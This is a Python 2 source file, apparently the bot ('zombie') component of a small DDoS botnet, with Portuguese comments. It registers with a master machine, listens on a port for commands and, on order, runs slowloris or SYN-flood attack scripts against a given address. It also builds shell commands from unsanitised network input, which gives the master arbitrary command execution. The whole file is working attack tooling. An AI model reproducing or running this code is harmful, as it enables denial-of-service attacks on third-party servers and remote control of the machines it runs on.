from socket import *
import os
import time
import sys

serverPort = 11750
serverPortSubscription = 11749

if len(sys.argv) == 2:

    masterClientIp = sys.argv[1]

    #se inscreve na lista de bots ativos do cliente
    subscriptionConfirmed = False
    while subscriptionConfirmed == False:
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect((masterClientIp,serverPortSubscription))
            subscriptionConfirmation = "subscriptionConfirmation"
            clientSocket.send(subscriptionConfirmation)
            print "Bot se inscreveu na lista do cliente " + masterClientIp
            subscriptionConfirmed = True
            clientSocket.close()
        except error, exc:
            print "Buscando cliente..."
            time.sleep(2)

    #espera o recebimento de um comando do cliente
    serverSocket = socket(AF_INET,SOCK_STREAM)
    #serverSocket.bind((masterClientIp,serverPort))
    serverSocket.bind(('',serverPort))
    serverSocket.listen(10)
    print 'Processo zumbi preparado para receber comandos.'
    while 1:
        connectionSocket, addr = serverSocket.accept()
        command = connectionSocket.recv(1024)
        args = command.split()
        print "Comando recebido:" + args[0]
        if len(args) > 1:
            if args[0] == "slowloris":
                print 'Iniciando o ataque slow loris...'
                connectionSocket.send("Confirmed")
                if len(args) == 2:
                    os.system("python slowloris.py" + " " + args[1])
                else:
                    if len(args) == 3:
                        os.system("python slowloris.py" + " " + args[1] + " " + args[2])
            else:
                if args[0] == "synflood" and len(args) == 3:
                    print 'Iniciando o ataque syn flood...'
                    connectionSocket.send("Confirmed")
                    os.system("sudo python synflood.py" + " " + args[1] + " " + args[2])
                else:
                    print 'Comando invalido synflood deve ser no formato synflood ipFonte ipDestino'
                    connectionSocket.send("Failed")
        else:
            print "Insira no minimo o nome do ataque e o endereco de ip destino"
        connectionSocket.close()
else:
    print "Insira o endereco de ip da maquina pai no formato: python zombie.py ipMaquinaPai"
